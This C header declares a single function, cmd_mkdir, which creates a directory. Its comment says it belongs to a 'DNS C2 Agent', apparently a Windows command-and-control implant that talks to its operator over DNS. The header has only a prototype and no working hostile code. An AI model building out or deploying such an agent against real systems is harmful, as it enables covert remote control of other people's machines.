/**
 * mkdir.h - Create directory command for DNS C2 Agent
 */

 #ifndef MKDIR_H
 #define MKDIR_H
 
 #include <windows.h>
 
 /**
  * Create a directory
  * 
  * @param args The directory to create
  * @return The result of the command (must be freed by caller)
  */
 char* cmd_mkdir(const char* args);
 
 #endif // MKDIR_H
 